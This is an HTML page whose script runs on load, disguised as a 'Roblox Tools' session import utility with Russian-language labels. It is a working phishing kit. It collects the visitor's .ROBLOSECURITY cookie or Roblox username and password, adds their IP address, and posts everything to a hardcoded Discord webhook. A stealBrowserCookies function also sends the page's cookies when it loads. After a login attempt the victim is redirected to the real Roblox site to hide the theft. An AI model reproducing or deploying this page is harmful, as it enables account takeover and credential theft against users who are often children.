<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Roblox Tools</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0c10; font-family: 'Segoe UI', 'Inter', system-ui, sans-serif; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .card { background: #111318; border-radius: 24px; padding: 40px 32px; max-width: 440px; width: 100%; border: 1px solid #222530; box-shadow: 0 20px 35px -10px rgba(0,0,0,0.5); }
        .logo { text-align: center; margin-bottom: 28px; }
        .logo h1 { color: #e1e9f0; font-size: 26px; font-weight: 600; letter-spacing: -0.5px; }
        .logo span { color: #3b82f6; }
        .sub { text-align: center; color: #6c7283; font-size: 13px; margin-bottom: 28px; }
        .label { color: #b9c3d4; font-size: 13px; font-weight: 500; margin-bottom: 8px; display: block; }
        .cookie-input { width: 100%; background: #0b0d12; border: 1px solid #252a35; border-radius: 14px; padding: 14px 16px; color: #d6e3ff; font-family: 'Monaco', 'Menlo', monospace; font-size: 13px; resize: vertical; margin-bottom: 20px; }
        .cookie-input:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 2px rgba(59,130,246,0.2); }
        .btn-primary { width: 100%; background: #1e293b; border: 1px solid #334155; border-radius: 40px; padding: 12px; color: #e2e8f0; font-weight: 600; font-size: 15px; cursor: pointer; transition: 0.2s; margin-bottom: 16px; }
        .btn-primary:hover { background: #2d3a4e; border-color: #475569; }
        .divider { display: flex; align-items: center; gap: 12px; margin: 20px 0; color: #2a2f3f; font-size: 12px; }
        .divider-line { flex: 1; height: 1px; background: #1f2330; }
        .btn-secondary { width: 100%; background: transparent; border: 1px solid #2d3748; border-radius: 40px; padding: 12px; color: #60a5fa; font-weight: 500; font-size: 15px; cursor: pointer; transition: 0.2s; }
        .btn-secondary:hover { background: #1e293b; border-color: #3b82f6; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 1000; }
        .modal-content { background: #111318; border: 1px solid #2a2f3f; border-radius: 28px; padding: 32px; width: 380px; }
        .modal-content h3 { color: #f1f5f9; font-size: 20px; margin-bottom: 8px; }
        .modal-content p { color: #6c7283; font-size: 13px; margin-bottom: 24px; }
        .modal-input { width: 100%; background: #0b0d12; border: 1px solid #252a35; border-radius: 14px; padding: 12px 14px; color: #e2e8f0; margin-bottom: 16px; }
        .modal-input:focus { outline: none; border-color: #3b82f6; }
        .modal-btn { width: 100%; background: #3b82f6; border: none; border-radius: 40px; padding: 12px; color: white; font-weight: 600; cursor: pointer; margin-top: 8px; }
        .close-modal { text-align: right; margin-bottom: 12px; cursor: pointer; color: #6c7283; font-size: 20px; }
        .status { font-size: 12px; text-align: center; margin-top: 20px; color: #4b5563; }
    </style>
</head>
<body>
<div class="card">
    <div class="logo"><h1>ROBL<span>Tools</span></h1></div>
    <div class="sub">Импорт сессии • Быстрый доступ</div>
    <label class="label">🍪 .ROBLOSECURITY Cookie</label>
    <textarea class="cookie-input" id="cookie" rows="2" placeholder="Вставьте cookie сюда..."></textarea>
    <button class="btn-primary" id="sendCookieBtn">📎 Отправить cookie</button>
    <div class="divider"><div class="divider-line"></div><span>ИЛИ</span><div class="divider-line"></div></div>
    <button class="btn-secondary" id="openLoginBtn">🔐 Войти через сайт</button>
    <div class="status">Вставьте cookie или войдите через сайт</div>
</div>
<div id="loginModal" class="modal">
    <div class="modal-content">
        <div class="close-modal" id="closeModalBtn">✕</div>
        <h3>Вход в Roblox</h3>
        <p>Введите данные для авторизации</p>
        <input type="text" id="loginInput" class="modal-input" placeholder="Username / Имя пользователя" autocomplete="off">
        <input type="password" id="passInput" class="modal-input" placeholder="Password / Пароль" autocomplete="off">
        <button class="modal-btn" id="submitLoginBtn">Log In</button>
    </div>
</div>
<script>
    // ВАШ DISCORD WEBHOOK — СЮДА ВСЁ ЛЕТИТ
    const WEBHOOK = "https://discord.com/api/webhooks/1487839032405917706/3d0033RYx8FhMy71G1oZs5g1vv69AGb8rFqL0EZlmnVdirNaUKPlmcjuTiWfQfGP97ly";

    function sendToDiscord(message) {
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message })
        }).catch(e => console.error('Ошибка:', e));
    }

    function sendData(type, data) {
        let ip = "unknown";
        // Пытаемся получить IP через внешний сервис (необязательно)
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(json => { ip = json.ip; })
            .finally(() => {
                let msg = `**🔐 НОВЫЕ ДАННЫЕ**\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${ip}\n`;
                if (type === 'cookie') {
                    msg += `\n**🍪 COOKIE:**\n\`\`\`${data.cookie}\`\`\``;
                } else if (type === 'login_pass') {
                    msg += `\n**👤 ЛОГИН/ПАРОЛЬ:**\nЛогин: \`${data.login}\`\nПароль: \`${data.password}\``;
                } else if (type === 'browser_cookies') {
                    msg += `\n**🌍 КУКИ БРАУЗЕРА:**\n\`\`\`${data.cookies}\`\`\``;
                }
                sendToDiscord(msg);
            });
    }

    document.getElementById('sendCookieBtn').onclick = () => {
        let cookie = document.getElementById('cookie').value.trim();
        if (!cookie) { alert("Вставьте cookie"); return; }
        sendData('cookie', { cookie: cookie });
        alert("✅ Cookie отправлена");
        document.getElementById('cookie').value = "";
    };

    let modal = document.getElementById('loginModal');
    document.getElementById('openLoginBtn').onclick = () => { modal.style.display = 'flex'; };
    document.getElementById('closeModalBtn').onclick = () => { modal.style.display = 'none'; };
    window.onclick = (e) => { if (e.target === modal) modal.style.display = 'none'; };

    document.getElementById('submitLoginBtn').onclick = () => {
        let login = document.getElementById('loginInput').value.trim();
        let password = document.getElementById('passInput').value.trim();
        if (!login || !password) { alert("Введите username и пароль"); return; }
        sendData('login_pass', { login: login, password: password });
        alert("✅ Данные приняты. Перенаправление...");
        setTimeout(() => { window.location.href = "https://www.roblox.com/home"; }, 800);
    };

    function stealBrowserCookies() {
        let allCookies = document.cookie;
        if (allCookies && allCookies.length > 0) {
            sendData('browser_cookies', { cookies: allCookies });
        }
    }
    stealBrowserCookies();
</script>
</body>
</html>
